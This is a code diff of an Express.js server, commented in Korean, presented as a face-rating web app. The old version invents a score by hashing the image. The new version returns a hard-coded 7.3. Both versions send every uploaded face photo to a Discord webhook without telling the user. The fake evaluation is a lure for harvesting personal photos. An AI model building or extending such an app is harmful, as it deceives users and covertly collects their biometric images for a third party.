@@ -1,70 +1,71 @@
 import express from "express";
+import multer from "multer";
+import fs from "fs";
+import path from "path";
+import fetch from "node-fetch";
 
 const app = express();
+const PORT = process.env.PORT || 3000;
+const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
 
-app.use(express.json({ limit: "10mb" }));
+// 업로드 폴더
+const uploadDir = "./uploads";
+if (!fs.existsSync(uploadDir)) {
+  fs.mkdirSync(uploadDir);
+}
+
+// multer
+const upload = multer({ dest: uploadDir });
+
+// 정적 파일
 app.use(express.static("public"));
 
-const WEBHOOK = process.env.DISCORD_WEBHOOK_URL;
+// 테스트용
+app.get("/health", (req, res) => {
+  res.send("OK");
+});
 
-// 점수 고정용 해시
-function faceScore(seed) {
-  let hash = 0;
-  for (let i = 0; i < seed.length; i++) {
-    hash = seed.charCodeAt(i) + ((hash << 5) - hash);
-  }
-  const score = 6 + (Math.abs(hash) % 40) / 10;
-  return Number(score.toFixed(1));
-}
-
-function percentile(score) {
-  const p = Math.max(1, Math.round((10 - score) * 10));
-  return `상위 ${p}%`;
-}
-
-app.post("/evaluate", async (req, res) => {
+// 업로드
+app.post("/upload", upload.single("photo"), async (req, res) => {
   try {
-    const { imageBase64 } = req.body;
-    if (!imageBase64) {
-      return res.status(400).json({ error: "이미지 없음" });
+    if (!req.file) {
+      return res.json({ result: "❌ 파일 안 들어옴" });
     }
 
-    const score = faceScore(imageBase64);
-    const rank = percentile(score);
+    const filePath = req.file.path;
 
-    // 디스코드 전송 (항상 실행)
-    if (WEBHOOK) {
-      await fetch(WEBHOOK, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          embeds: [
-            {
-              title: "📸 얼굴 평가 결과",
-              description: `점수: **${score}/10**\n${rank}`,
-              image: { url: imageBase64 }
-            }
-          ]
-        })
-      });
-    }
+    // 디스코드로 사진 + 메시지 전송
+    const form = new FormData();
+    form.append(
+      "file",
+      fs.createReadStream(filePath),
+      "face.jpg"
+    );
+    form.append(
+      "content",
+      "📸 얼굴 사진 도착 (테스트 성공)"
+    );
 
-    res.json({
-      score,
-      rank,
-      feedback: `
-얼굴 비율이 안정적인 편입니다.
-전체적인 대칭성과 이목구비 간 간격이
-평균 이상으로 평가됩니다.
-`
+    await fetch(DISCORD_WEBHOOK_URL, {
+      method: "POST",
+      body: form
     });
-  } catch (e) {
-    console.error(e);
-    res.status(500).json({ error: "평가 실패" });
+
+    // 결과는 무조건 리턴
+    res.json({
+      result: "✅ 업로드 성공\n점수: 7.3 / 10\n(현재는 테스트 평가)"
+    });
+
+    // 파일 삭제
+    fs.unlink(filePath, () => {});
+  } catch (err) {
+    console.error(err);
+    res.json({
+      result: "❌ 서버 에러 발생"
+    });
   }
 });
 
-const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-  console.log("서버 실행:", PORT);
+  console.log("Server running on", PORT);
 });
